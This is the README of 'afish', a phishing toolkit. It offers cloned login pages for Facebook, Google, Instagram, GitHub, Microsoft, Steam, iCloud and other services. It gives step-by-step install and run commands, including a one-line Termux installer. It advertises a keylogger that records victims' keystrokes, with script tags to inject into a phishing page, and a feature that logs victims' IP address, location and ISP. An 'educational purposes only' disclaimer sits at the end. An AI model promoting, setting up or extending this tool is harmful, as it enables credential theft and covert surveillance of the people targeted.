
# __________________________________
# THIS PROJECT HAVE BEEN MOVED TO AbhishekChougule  
# FOR MORE UPDATES VISIT: https://github.com/An0nym0us-Hacker/afish  
# __________________________________
<p align="center">
  <img src="logo.png">  
</p>

<p align="center">
      Modern phishing tool with advanced functionality 
</p>

<p align="center">
 NOW WE HAVE ADDED KEYLOGGER WITH THE PHISHING PAGES // VICTIM DEVICE INFO ALSO AVAILABLE
 
 
</p>

### PREREQUISITES ( Please verify if you have installed )

* Python 3
* Wget from Python
* PHP
* sudo


### TESTED ON FOLLOWING
* **Kali Linux - Rolling Edition**

* **Parrot OS - Rolling Edition**

* **Linux Mint - 18.3 Sylvia**

* **Ubuntu - 16.04.3 LTS**

* **MacOS High Sierra**

* **Arch Linux**

* **Manjaro XFCE Edition 17.1.12**

* **Black Arch**

### CLONE
```
git clone https://github.com/An0nym0us-Hacker/afish.git
```

### RUNNING (In Linux)

```
cd afish
```

```
sudo apt install python3-pip
```

```
sudo pip3 install -r requirements.txt
```

```
chmod 777 afish.py
```

```
python3 afish.py

```
   OR
   
```
./afish.py    

```
### RUNNING (If distro based on Arch Linux)

```
cd afish
```

```
sudo pacman -Syu
```
```
sudo pacman -S python-pip
```

```
sudo pip3 install -r requirements.txt
```

```
chmod 777 afish.py
```

```
python3 afish.py

```
   OR
   
```
./afish.py    

```

### RUNNING (For Android users in Termux)

```
First install { Termux } from Playstore.

```

```
After opening Follow below commands One by one

```

```
pkg install git python php curl openssh grep

```
```
pip3 install wget

```
```
git clone https://github.com/An0nym0us-Hacker/afish.git

```
```
cd afish

```
```
chmod 777 afish.py

```
```
python afish.py

or

./afish.py

```
### Running (One Code installation in termux)


```
First install { Termux } from Playstore.

```

```
After opening Copy and run this Single Command.

```
```
pkg install git python php curl openssh grep && pip3 install wget && git clone https://github.com/An0nym0us-Hacker/afish && cd afish && chmod 777 afish.py && python afish.py

```

## AVAILABLE PAGES

**+ Facebook:**
- Traditional Facebook login page.
- Advanced Poll Method.
- Fake Security login with Facebook Page. 
- Facebook messenger login page.

**+ Google:**
- Traditional Google login page.
- Advanced Poll Method.

**+ LinkedIn:**
- Traditional LinkedIn login page.

**+ Github:**
- Traditional Github login page.

**+ Stackoverflow:**
- Traditional Stackoverflow login page.

**+ Wordpress:**
- Similar Wordpress login page.

**+ Twitter:**
- Traditional Twitter login page.

**+ Instagram:**
- Traditional Instagram login page.
- Instagram Autoliker Phishing Page [ ADVANCED METHOD ADOPTED ].

### WHAT'S NEW FEATURES
**1) LIVE ATTACK**
- Now you will have live information about the victims such as : IP ADDRESS, Geolocation, ISP, Country, & many more.

**2) COMPATIBILITY**
- All the sites are mobile compatible.

**3) KEYLOGGER**
- Now you will also have the ability to capture all the keystokes of victim.

**(CURRENTLY):- This feature is added on instagram web page and github, to less the possibility of slow functioning of generated link)

**HOW TO ADD IT MANUALLY ?
-- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)

```
<script src="keylogger.js"></script>
<script src="keylogger.php"></script>

```



### NEW PAGES
<p align="center">
  
**1) FACEBOOK PHISHING:**
- Traditional Facebook login page.
- Advanced Poll Method.
- Fake Security login with Facebook Page. 
- Facebook messenger login page.
        
 **2) INSTAGRAM PHISHING:**
 - Traditional Login Page
 - Fake instagram Autoliker Page [ REDIRECTS TO ORIGINAL AUTOLIKER PAGE AFTER SUBMIT ] 

 **3) SNAPCHAT PHISHING:**
 - Traditional Snapchat Login Page
 
 **4) YAHOO PHISHING:**
 - Traditional Yahoo Login Page
 
 **5) TWITCH PHISHING:**
 - Traditional Twitch Login Page [ Login With  Facebook Also Available ]
 
 **6) MICROSOFT PHISHING:**
 - Traditional Microsoft-Live Web Login Page
 
 **7) STEAM PHISHING:**
 - Traditional Steam Web Login Page
 
 **8) VK PHISHING:**
 - Traditional VK Web Login Page
 - Advanced Poll Method
 
 **9) ICLOUD PHISHING:**
 - Traditional iCloud Web Login Page
</p>

## DISCLAIMER
<p align="center">
  TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>

The use of the afish is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program.

"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
Taken from [LICENSE](LICENSE).